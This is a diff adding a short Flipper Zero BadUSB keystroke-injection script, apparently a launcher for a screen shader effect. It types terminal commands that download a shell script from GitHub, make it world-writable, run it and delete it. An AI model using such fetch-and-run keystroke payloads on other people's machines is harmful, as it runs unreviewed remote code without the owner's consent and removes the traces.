@@ -1,0 +1,11 @@
+REM RUN DOWNLOADED .SH
+GUI ENTER
+DELAY 1000
+STRING wget https://raw.githubusercontent.com/knoxoxen/Omarchy-Flipper0-Badusb/main/launchers/screenpartsshader/screenpartsshader.sh
+ENTER
+DELAY 5000
+STRING chmod 777 screenpartsshader.sh
+ENTER
+STRINGLN ./screenpartsshader.sh
+STRING rm -f screenpartsshader.sh screenpartsshader-fx
+ENTER
